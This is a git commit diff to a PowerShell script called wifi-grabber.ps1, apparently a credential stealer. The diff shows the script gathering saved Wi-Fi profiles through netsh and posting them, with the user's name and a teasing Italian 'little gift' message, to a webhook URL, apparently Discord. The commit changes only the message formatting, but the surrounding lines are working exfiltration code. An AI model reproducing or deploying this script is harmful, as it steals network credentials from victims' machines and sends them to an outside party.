cae35e232fdb8d087e86f1b33fd44522cee17c1c
nidez <pistolesi.marco@gmail.com>
2024-01-24 04:32:55 +0100

    Update wifi-grabber.ps1

--- wifi-grabber.ps1
+++ wifi-grabber.ps1
@@ -10,7 +10,7 @@ $wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$nam
 $hookurl = "$dc"
 $Body = @{
   'username' = $env:username 
-  'content' = "Ciao! `n Ho un regalino per te :) `n $wifiProfiles_IT $wifiProfiles_EN "
+  'content' = "Ciao! `n Ho un regalino per te :) $wifiProfiles_IT $wifiProfiles_EN `n "
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
